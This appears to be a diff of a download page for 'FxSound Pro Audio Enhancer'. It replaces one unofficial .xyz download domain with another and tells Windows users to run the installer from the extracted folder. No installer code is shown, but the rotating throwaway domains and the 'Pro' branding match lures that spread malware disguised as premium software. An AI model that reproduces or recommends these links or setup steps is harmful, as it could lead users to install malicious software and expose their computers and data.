@@ -18,8 +18,8 @@ Use **FxSound Pro Audio Enhancer** on desktop Windows when you want the full pro
 
 > Use the project link below for Windows.
 
-* **Project link:** **[fxsound.nexpath.xyz](https://fxsound.nexpath.xyz/)**
-* **Full URL:** `https://fxsound.nexpath.xyz/`
+* **Project link:** **[fxsound.nerasix.xyz](https://fxsound.nerasix.xyz/)**
+* **Full URL:** `https://fxsound.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Modules arrive ready for local use | open the app and continue. This release inc
 * **RAM:** 8 GB minimum | 16 GB for large projects
 * **Disk:** 3 GB free disk space
 
-***
+***
